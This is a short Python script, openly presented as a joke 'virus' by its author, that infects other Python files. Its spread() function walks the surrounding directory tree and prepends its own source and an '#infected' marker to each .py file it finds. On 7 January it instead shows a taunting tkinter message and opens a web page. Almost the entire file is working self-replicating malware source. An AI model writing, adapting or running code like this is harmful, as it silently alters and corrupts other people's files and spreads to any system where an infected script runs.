from datetime import datetime
import pathlib
import os
import webbrowser
import tkinter
import sys

day = datetime.now().day
month = datetime.now().month
path = pathlib.Path(os.path.dirname(__file__))

def spread():
    for entry in path.iterdir():
        if entry.is_dir() is True:
            for sub_entry in pathlib.Path(entry).rglob("*"):
                if sub_entry.match("*.py") is True:
                    with open(sub_entry, mode="+r") as f:
                        if f.readline() == "#infected\n":
                            break
                        else:
                            target = open(sub_entry, mode="+r")
                            aux = target.read()
                            target.close()

                            target = open(sub_entry, mode="+w")
                            target.write("#infected\n\n")
                            target.write(open(__file__).read())
                            target.write("\n")
                            target.write(aux)
                            target.write("\n")
                            target.close()
        else:
            if entry.match(str(__file__)) is False:
                if entry.match("*.py") is True:
                    with open(entry, mode="+r") as f:
                        if f.readline() == "#infected\n":
                            break
                        else:
                            target = open(entry, mode="+r")
                            aux = target.read()
                            target.close()

                            target = open(entry, mode="+w")
                            target.write("#infected\n\n")
                            target.write(open(__file__).read())
                            target.write("\n")
                            target.write(aux)
                            target.write("\n")
                            target.close()

def magic():
    webbrowser.open("https://winnyace.github.io")
    sys.exit()

def payload():
    r = tkinter.Tk()

    lbl = tkinter.Label(r, text="You got infected with winny's virus.\nI called 'kek' because kek, I'm a criminal with my code and especially with my jokes and names.\nI guess see ya around!\nPS:Asuka Kurashina is the best girl!<3")
    lbl.pack()

    btn = tkinter.Button(r, text="Ok", command=magic)
    btn.pack()

    r.mainloop()

def main():
    # very advanced debugging below
    # day = 7
    # month = 1
    # very complex, right? pro hax0r. hire me google 
    if day == 7 and month == 1:
        payload()
    else:
        spread()

if __name__ == "__main__":
    main()
